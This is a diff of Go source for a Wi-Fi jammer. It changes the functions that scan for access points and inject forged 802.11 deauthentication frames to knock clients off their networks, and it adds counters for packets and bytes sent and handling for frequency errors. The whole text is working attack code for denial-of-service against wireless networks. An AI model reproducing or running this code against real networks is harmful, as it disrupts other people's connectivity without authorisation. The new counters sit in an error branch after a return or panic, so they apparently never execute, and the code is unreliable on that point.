@@ -21,6 +21,7 @@ type JamConn		struct {
 	lastDeauth		time.Time
 	lastChanSwitch	time.Time
 	lastAPScan		time.Time
+	currentFreq		uint32
 	nlconn			*genetlink.Conn
 	ifa				*net.Interface
 	fam				*genetlink.Family
@@ -99,6 +100,7 @@ func	(conn *JamConn)	SetDeviceChannel(c int) error {
 		}
 		return errors.New("genetlink.Conn.Execute() " + err.Error())
 	}
+	conn.currentFreq = chann.CenterFreq
 	return nil
 }
 
@@ -139,6 +141,7 @@ func	(conn *JamConn)	SetDeviceFreq(freq layers.RadioTapChannelFrequency) error {
 		}
 		return errors.New("genetlink.Conn.Execute() " + err.Error())
 	}
+	conn.currentFreq = chann.CenterFreq
 	return nil
 }
 
@@ -315,7 +318,7 @@ func	(conn *JamConn)	SetIfaType(ifaType uint32) error {
 	return nil
 }
 
-func (conn *JamConn) DoAPScan(APWList *List, APTargList *List) (err error) {
+func (conn *JamConn) DoAPScan(apWList *List, apList *List) (err error) {
 
 	if err := conn.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
 		return errors.New("JamConn.SetIfaType() " + err.Error())
@@ -349,7 +352,7 @@ func (conn *JamConn) DoAPScan(APWList *List, APTargList *List) (err error) {
 		return errors.New("genetlink.LeaveGroup() " + err.Error())
 	}
 	conn.SetLastAPScan(time.Now())
-	appendApList(results, APTargList, APWList)
+	appendApList(results, apList, apWList)
 	return nil
 }
 
@@ -377,27 +380,41 @@ func	(conn *JamConn)	DeauthClientsIfPast(timeout time.Duration, count uint16, ap
 		for _, v := range apList.contents {
 			ap := v.(AP)
 			for _, cli := range ap.clients {
-				if err := conn.Deauthenticate(
+				if bSent, err := conn.Deauthenticate(
 				count, layers.Dot11ReasonDeauthStLeaving,
 				cli.hwaddr, ap.hwaddr,
 				cli.tap, cli.dot); err != nil {
-					if err.Error() == "Bad file descriptor" {
+					if err.Error() == "send: Bad file descriptor" {
 						QuitG = true
 						return
 					} else {
 						log.Panicln("JamConn.Deauthenticate() " + err.Error())
-					}				}
+					}
+					StatsG.sentBytes += uint64(bSent)
+					StatsG.sentPackts += 1
+					cli.nDeauth += uint32(count)
+					ApListMutexG.Lock()
+					apList.Add(ap.hwaddr.String()[:16], ap)
+					ApListMutexG.Unlock()
+				}
+
 				//Previous authentication no longer valid.
-				if err := conn.Deauthenticate(
+				if bSent, err := conn.Deauthenticate(
 					count, 0x2,
 					ap.hwaddr, cli.hwaddr,
 					ap.tap, ap.dot); err != nil {
-						if err.Error() == "Bad file descriptor" {
-							QuitG = true
-							return
-						} else {
-							log.Panicln("JamConn.Deauthenticate() " + err.Error())
-						}
+					if err.Error() == "send: Bad file descriptor" {
+						QuitG = true
+						return
+					} else {
+						log.Panicln("JamConn.Deauthenticate() " + err.Error())
+					}
+					StatsG.sentBytes += uint64(bSent)
+					StatsG.sentPackts += 1
+					cli.nDeauth += uint32(1)
+					ApListMutexG.Lock()
+					apList.Add(ap.hwaddr.String()[:16], ap)
+					ApListMutexG.Unlock()
 				}
 			}
 		}
@@ -436,15 +453,21 @@ func	createDot11Header(
 func	(conn *JamConn)	Deauthenticate(
 			count uint16, reason layers.Dot11Reason,
 			src net.HardwareAddr, dst net.HardwareAddr,
-			tap layers.RadioTap, dot11Orig layers.Dot11) error {
+			tap layers.RadioTap, dot11Orig layers.Dot11) (nBytes uint32, err error) {
 
-	var i		uint16
-	var opts	gopacket.SerializeOptions
-	var buff	gopacket.SerializeBuffer
+	var i			uint16
+	var opts		gopacket.SerializeOptions
+	var buff		gopacket.SerializeBuffer
+	var bSent		uint32
 
 	if tap.ChannelFrequency != 0 {
-		if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil && !OptsG.GuiMode {
-			fmt.Println(err)
+		if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil {
+			if err.Error() == "operation not permitted" {
+				OptsG.FiveGhzSupport = false
+			}
+			if !OptsG.GuiMode {
+				fmt.Println(err)
+			}
 		}
 	}
 	opts.ComputeChecksums = true
@@ -464,14 +487,15 @@ func	(conn *JamConn)	Deauthenticate(
 			&dot11,
 			&mgmt,
 		); err != nil {
-			return errors.New("gopacket.SerializeLayers() " + err.Error())
+			return bSent, err
 		}
 		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
-			return errors.New("Handle.WritePacketData() " + err.Error())
+			return bSent, err
 		}
+		bSent += uint32(len(buff.Bytes()))
 		dot11.SequenceNumber += 1
 	}
-	return nil
+	return bSent, nil
 }
 
 func	(conn *JamConn)	Disassociate(
